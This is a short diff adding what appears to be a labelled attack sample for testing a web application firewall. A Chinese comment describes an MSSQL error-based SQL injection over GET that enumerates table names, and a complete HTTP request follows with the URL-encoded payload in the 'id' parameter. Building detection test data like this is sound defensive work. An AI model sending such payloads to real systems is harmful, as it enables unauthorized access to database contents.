@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_报错注入-06506432
+# 攻击者基于报错查询，将"(select top 1 name from mydb.sys.all_objects where type='U' and is_ms_shipped=0 and name not in ('admin'))>0 "语句注入到 SQL 查询参数中，目的是获取数据库中所有表名。
+GET /?id=1%20and%20%28select%20top%201%20name%20from%20mydb.sys.all_objects%20where%20type=%27U%27%20and%20is_ms_shipped=0%20and%20name%20not%20in%20%28%27admin%27%29%29%3E0%20&bid=hd_tag_m8mv26ns HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26ns
+RM-PRO-Token: 9cef2fd1d83bf6db6a015980e25d94f2
+RM-PRO-Time: 1742808642097
+User-Agent: curl/7.83.1
+
